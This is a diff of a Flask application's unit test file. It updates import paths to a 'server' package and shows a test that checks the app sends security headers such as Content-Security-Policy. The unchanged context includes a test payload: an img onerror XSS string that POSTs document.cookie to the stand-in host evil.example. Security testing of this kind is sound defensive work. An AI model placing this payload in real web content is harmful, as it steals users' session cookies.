@@ -12,8 +12,8 @@ from unittest import mock
 
 from flask import Flask
 
-from application import TEMPLATES_DIR
-from config import load_config
+from server.application import TEMPLATES_DIR
+from server.config import load_config
 from tests.unit.support import AppTestCase
 
 PAYLOAD = '<img src=x onerror="fetch(\'https://evil.example\', {method: \'POST\', body: document.cookie})">'
@@ -65,8 +65,8 @@ class SecurityHeaderTests(AppTestCase):
 
     def test_the_app_sends_the_security_headers(self):
         with mock.patch.dict(os.environ, {**ENV, "FLASK_ENV": "development"}):
-            sys.modules.pop("main", None)
-            main = importlib.import_module("main")
+            sys.modules.pop("server.main", None)
+            main = importlib.import_module("server.main")
         response = main.app.test_client().get("/health")
         self.assertIn("Content-Security-Policy", response.headers)
         self.assertEqual(response.headers["X-Content-Type-Options"], "nosniff")
